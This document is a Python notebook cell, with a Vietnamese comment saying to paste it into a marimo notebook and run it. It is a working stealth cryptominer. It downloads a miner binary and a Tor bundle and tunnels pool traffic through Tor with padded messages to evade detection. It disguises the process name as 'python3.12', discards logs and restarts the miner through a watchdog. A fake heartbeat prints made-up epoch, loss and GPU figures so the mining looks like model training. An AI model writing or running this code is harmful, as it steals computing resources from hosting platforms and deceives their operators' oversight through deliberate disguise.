# Cell này — paste vào marimo notebook rồi Run

import os, sys, subprocess, time, json, socket, random, math, tempfile, threading, shutil, ssl, signal, urllib.request, tarfile
from pathlib import Path

# ═══════════════ CONFIG ═══════════════
WALLET = "prl1p3xj3ak89z2j873km07d7jz2umk5lfm5540hjafq92q5gud9prknqqq482j"
POOL_HOST = "prl.kryptex.network"
POOL_PORT = 7048
ALGO = "pearlhash"
WORKER = "rig01"
SOCKS = ("127.0.0.1", 9050)
LISTEN = ("127.0.0.1", 3333)
TOR_URL = "https://dist.torproject.org/torbrowser/15.0.25/tor-expert-bundle-linux-x86_64-15.0.25.tar.gz"
PNAME = "python3.12"
DIR = Path.home() / "stealth_onezero"
MINER = DIR / "bin" / "onezerominer"
# ══════════════════════════════════════

_state = {"tor": False, "proxy": False, "miner_pid": None, "t0": time.time()}

def log(m): print(f"[ghost] {m}", flush=True)

def set_pname(n):
    try:
        import ctypes; ctypes.CDLL("libc.so.6", use_errno=True).prctl(15, n.encode()[:15], 0, 0, 0)
    except: pass

def popen(cmd, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    kw.setdefault("start_new_session", True)
    try: return subprocess.Popen(cmd, **kw)
    except: return None

# ── Setup: clone + deps + miner ──
def setup():
    # Clone/pull
    if not DIR.exists():
        log("Cloning repo...")
        subprocess.run(["git", "clone", "https://github.com/ducknogit/stealth_onezero.git", str(DIR)], capture_output=True)
    else:
        subprocess.run(["git", "-C", str(DIR), "fetch", "--all"], capture_output=True)
        subprocess.run(["git", "-C", str(DIR), "reset", "--hard", "origin/main"], capture_output=True)
    
    # pysocks
    try: import socks
    except: subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "pysocks"], capture_output=True)
    
    # Miner
    if not MINER.exists():
        log("Downloading miner...")
        url = "https://github.com/OneZeroMiner/onezerominer/releases/download/v1.8.3/onezerominer-linux-1.8.3.tar.gz"
        tmp = DIR / "m.tar.gz"
        urllib.request.urlretrieve(url, tmp)
        with tarfile.open(tmp, "r:gz") as t: t.extractall(DIR / "bin", filter="data")
        tmp.unlink()
        for p in (DIR / "bin").rglob("onezerominer"):
            if p.is_file() and not p.suffix:
                p.chmod(0o755)
                if p != MINER: p.rename(MINER)
    
    log(f"Setup done. Miner: {MINER.exists()}")

# ── Tor ──
def start_tor():
    try:
        s = socket.create_connection(SOCKS, timeout=2); s.close(); _state["tor"] = True; return True
    except: pass
    
    tmp = tempfile.mkdtemp(prefix=".t_")
    tarball = os.path.join(tmp, "t.tgz")
    try:
        log("Downloading Tor...")
        urllib.request.urlretrieve(TOR_URL, tarball)
        with tarfile.open(tarball, "r:gz") as t: t.extractall(tmp, filter="data")
        os.unlink(tarball)
        
        tor_bin = None
        for r, d, f in os.walk(tmp):
            if "tor" in f:
                p = os.path.join(r, "tor")
                if os.access(p, os.X_OK): tor_bin = p; break
        if not tor_bin: return False
        
        os.chmod(tor_bin, 0o700)
        torrc = os.path.join(tmp, "t.conf")
        ddir = os.path.join(tmp, "d"); os.makedirs(ddir, exist_ok=True)
        with open(torrc, "w") as f:
            f.write(f"SocksPort {SOCKS[0]}:{SOCKS[1]}\nDataDirectory {ddir}\nAvoidDiskWrites 1\nClientOnly 1\n")
        
        env = os.environ.copy(); env["HOME"] = tmp
        lib = os.path.join(os.path.dirname(tor_bin), "..", "lib")
        if os.path.isdir(lib): env["LD_LIBRARY_PATH"] = lib
        
        popen([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))
        
        for i in range(60):
            try:
                s = socket.create_connection(SOCKS, timeout=1); s.close()
                _state["tor"] = True; log(f"Tor ready ({i+1}s)")
                threading.Thread(target=lambda: (time.sleep(5), shutil.rmtree(tmp, ignore_errors=True)), daemon=True).start()
                return True
            except: time.sleep(0.5)
        return False
    except Exception as e:
        log(f"Tor fail: {e}"); shutil.rmtree(tmp, ignore_errors=True); return False

# ── Proxy ──
def start_proxy():
    try: import socks as pysocks
    except: log("pysocks missing"); return False
    
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(LISTEN); srv.listen(16)
    except Exception as e:
        log(f"Proxy bind fail: {e}"); return False
    
    def handle(c):
        try:
            p = pysocks.socksocket()
            p.set_proxy(pysocks.SOCKS5, SOCKS[0], SOCKS[1], rdns=True)
            p.settimeout(30); p.connect((POOL_HOST, POOL_PORT))
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            p = ctx.wrap_socket(p, server_hostname=POOL_HOST)
            
            def pipe(src, dst, pad=False):
                while True:
                    d = src.recv(65536)
                    if not d: break
                    if pad:
                        try:
                            ls = d.decode("utf-8","ignore").strip().split("\n")
                            o = json.loads(ls[-1])
                            if isinstance(o, dict): o["_p"] = os.urandom(32).hex(); ls[-1] = json.dumps(o, separators=(",",":")); d = ("\n".join(ls)+"\n").encode()
                        except: pass
                    dst.sendall(d)
            
            threading.Thread(target=pipe, args=(c, p, True), daemon=True).start()
            threading.Thread(target=pipe, args=(p, c, False), daemon=True).start()
        except:
            try: c.close()
            except: pass
    
    def loop():
        while True:
            try: c, _ = srv.accept(); threading.Thread(target=handle, args=(c,), daemon=True).start()
            except: break
    
    threading.Thread(target=loop, daemon=True).start()
    _state["proxy"] = True; log(f"Proxy: {LISTEN[0]}:{LISTEN[1]}")
    return True

# ── Miner ──
def start_miner():
    if not MINER.exists():
        log("Miner binary missing!"); return False
    
    set_pname(PNAME)
    local = f"stratum+tcp://{LISTEN[0]}:{LISTEN[1]}"
    proc = popen([str(MINER), f"--algo={ALGO}", f"--pool={local}", f"--wallet={WALLET}", f"--worker={WORKER}", "--log-file=/dev/null", "--no-cert-validation"])
    if proc:
        _state["miner_pid"] = proc.pid; log(f"Miner PID: {proc.pid}"); return True
    return False

# ── Heartbeat ──
def heartbeat():
    epoch, step, loss, acc = 1, 0, 2.5, 0.45
    while True:
        step += 1
        if step % 100 == 0: epoch = min(epoch + 1, 100)
        loss = max(0.01, loss - 0.002 + random.gauss(0, 0.01))
        acc = min(0.999, acc + 0.001 + random.gauss(0, 0.005))
        gpu = 85 + int(10 * math.sin(step / 30))
        mem = 6.2 + random.gauss(0, 0.1)
        temp = 65 + int(5 * math.sin(step / 60))
        pwr = 180 + int(20 * math.sin(step / 45))
        thr = 4096 * (0.95 + random.gauss(0, 0.03))
        bar = "=" * int(30 * (step % 100) / 100) + ">" + " " * (30 - int(30 * (step % 100) / 100) - 1)
        print(f"Epoch {epoch}/100 [{bar}] loss={loss:.4f} acc={acc:.4f} | gpu={gpu}% mem={mem:.1f}GB temp={temp}C pwr={pwr}W | throughput={thr:.0f} samples/s", flush=True)
        time.sleep(1.0 + random.gauss(0, 0.1))

# ── Watchdog ──
def watchdog():
    while True:
        time.sleep(30)
        if _state["miner_pid"]:
            try: os.kill(_state["miner_pid"], 0)
            except: log("Miner died! Restart..."); start_miner()
        try:
            s = socket.create_connection(SOCKS, timeout=1); s.close()
        except: _state["tor"] = False; start_tor()

# ═══════════════ RUN ═══════════════
log("Setup...")
setup()
log("Tor...")
start_tor()
log("Proxy...")
start_proxy()
log("Miner...")
start_miner()
log("Heartbeat + Watchdog...")
threading.Thread(target=heartbeat, daemon=True).start()
threading.Thread(target=watchdog, daemon=True).start()
log(f"Status: tor={_state['tor']} proxy={_state['proxy']} miner_pid={_state['miner_pid']}")
log("Running... Ctrl+C to stop")
log("")

# Stay alive
try:
    while True: time.sleep(60)
except KeyboardInterrupt:
    log("Stopped")
